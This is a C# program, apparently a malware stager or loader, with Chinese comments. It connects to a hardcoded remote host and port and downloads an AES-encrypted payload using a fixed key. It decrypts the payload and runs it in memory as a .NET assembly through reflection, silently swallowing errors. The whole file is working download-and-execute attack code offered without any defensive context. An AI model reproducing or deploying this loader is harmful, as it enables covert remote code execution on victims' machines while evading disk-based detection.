using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Sockets;
using System.Reflection;
using System.Security.Cryptography;
using System.Threading;

namespace client
{
    internal class Program
    {
        static string IP = "192.168.214.1";
        static int port = 12345;

        static void Main(string[] args)
        {
            byte[] key = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };
            byte[] iv = { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10 };
            TcpClient client = new TcpClient(IP, port);
             // 接收文件
             byte[] receivedData = ReceiveFile(client,key,iv);
             client.Close();
             RunPayload(receivedData);
        }
        public static byte[] ReceiveFile(TcpClient client, byte[] key, byte[] iv)
        {
            NetworkStream netStream = client.GetStream();
            List<byte> receivedBytes = new List<byte>();
            byte[] buffer = new byte[4096];
            int bytesRead;

            while ((bytesRead = netStream.Read(buffer, 0, buffer.Length)) > 0)
            {
                for (int i = 0; i < bytesRead; i++)
                {
                    receivedBytes.Add(buffer[i]);
                }
            }

            byte[] encryptedData = receivedBytes.ToArray();
            byte[] decryptedData = AesEncryption.Decrypt(encryptedData, key, iv);
            Console.WriteLine("文件接收完成。");

            return decryptedData;
        }
        private static void RunPayload(byte[] payload)
        {
            new Thread(() =>
            {
                try
                {
                    Assembly asm = AppDomain.CurrentDomain.Load(payload);
                    MethodInfo Metinf = asm.EntryPoint;
                    object InjObj = asm.CreateInstance(Metinf.Name);
                    object[] parameters = new object[1];  // C#
                    if (Metinf.GetParameters().Length == 0)
                    {
                        parameters = null; // VB.NET
                    }
                    Metinf.Invoke(InjObj, parameters);
                }
                catch { }
            })
            { IsBackground = false }.Start();
        }
        public static class AesEncryption
        {
            public static byte[] Encrypt(byte[] data, byte[] key, byte[] iv)
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = key;
                    aesAlg.IV = iv;

                    using (MemoryStream msEncrypt = new MemoryStream())
                    {
                        using (ICryptoTransform encryptor = aesAlg.CreateEncryptor(aesAlg.Key, aesAlg.IV))
                        {
                            using (CryptoStream csEncrypt = new CryptoStream(msEncrypt, encryptor, CryptoStreamMode.Write))
                            {
                                csEncrypt.Write(data, 0, data.Length);
                                csEncrypt.FlushFinalBlock();
                            }
                        }
                        return msEncrypt.ToArray();
                    }
                }
            }

            public static byte[] Decrypt(byte[] encryptedData, byte[] key, byte[] iv)
            {
                using (Aes aesAlg = Aes.Create())
                {
                    aesAlg.Key = key;
                    aesAlg.IV = iv;

                    using (MemoryStream msDecrypt = new MemoryStream(encryptedData))
                    {
                        using (ICryptoTransform decryptor = aesAlg.CreateDecryptor(aesAlg.Key, aesAlg.IV))
                        {
                            using (CryptoStream csDecrypt = new CryptoStream(msDecrypt, decryptor, CryptoStreamMode.Read))
                            {
                                using (MemoryStream decryptedData = new MemoryStream())
                                {
                                    csDecrypt.CopyTo(decryptedData);
                                    return decryptedData.ToArray();
                                }
                            }
                        }
                    }
                }
            }
        }

    }

}
